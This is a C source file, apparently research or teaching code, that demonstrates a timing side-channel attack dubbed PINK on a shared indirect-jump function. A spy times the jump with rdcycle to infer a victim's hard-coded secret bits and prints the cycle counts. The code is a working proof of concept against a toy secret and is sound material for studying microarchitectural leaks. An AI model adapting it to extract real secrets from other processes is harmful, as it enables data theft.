/*/////////////////////////////////////////////////////////////////////////////////
 * Name: Pointer-based Indirect jump with Known targets Attack
 * Author: Rutvik Chavda
 * Description: This code demonstrates the PINK attack using indirect jumps. The
 *              victim and spy share the indirJump function, where the victim's
 *              target address depends on secret data. The spy measures the timing
 *              to infer the secret based on whether the target was previously
 *              accessed by the victim.
 * License: GPL v3 - https://www.gnu.org/licenses/gpl-3.0.html
 /////////////////////////////////////////////////////////////////////////////////*/

#include <stdint.h>
#include "encoding.h"
#include <stdlib.h>
#include <stdio.h>

#define K 10
#define SECRET_DATA_SIZE 8

unsigned int diff_values[K][SECRET_DATA_SIZE] = {};
unsigned int start, diff;

void indirJump(int val) {
    // Perform an indirect jump based on the value
    void* target_addr = (void*)(val * ((uint64_t)&&T2) + (1 - val) * ((uint64_t)&&T1));
    goto *target_addr;

    T1: __asm__ __volatile__("nop\n"
               "nop\n");
    T2: __asm__ __volatile__("nop\n"
               "nop\n");
}

void victim_f(int val) {
    uint8_t secret_data[SECRET_DATA_SIZE] = {1, 0, 0, 1, 1, 0, 1, 0}; // Secret data
    indirJump(secret_data[val]);
}

void spy_f(int val, int k, int i) {
    uint8_t array1[1] = {1}; // Dummy array for timing
    start = rdcycle();
    indirJump(array1[val]);
    diff = rdcycle() - start;
    diff_values[k][i] = diff;
}

int main(void) {
    // Train the victim function and gather timing data
    for (int i = 0; i < SECRET_DATA_SIZE; i++) {
        for (int k = 0; k < K; k++) {
            victim_f(i); // Victim code accessing the indirect jump
            spy_f(0, k, i); // Spy measuring timing for T1 jump
        }
    }

    // Analyzing the gathered timing data
    printf("\nLower cycle count values coincide with the dummy value (1) in the spy array.\n");
    for (int i = 0; i < SECRET_DATA_SIZE; i++) {
        printf("Index: %d, Cycle count: ", i+1);
        for (int k = 0; k < K; k++) {
            // Filter out abnormally high values due to background kernel tasks
            if (diff_values[k][i] < 200) {
                printf("%u ", diff_values[k][i]);
            }
        }
        printf("\n");
    }
    return 0;
}
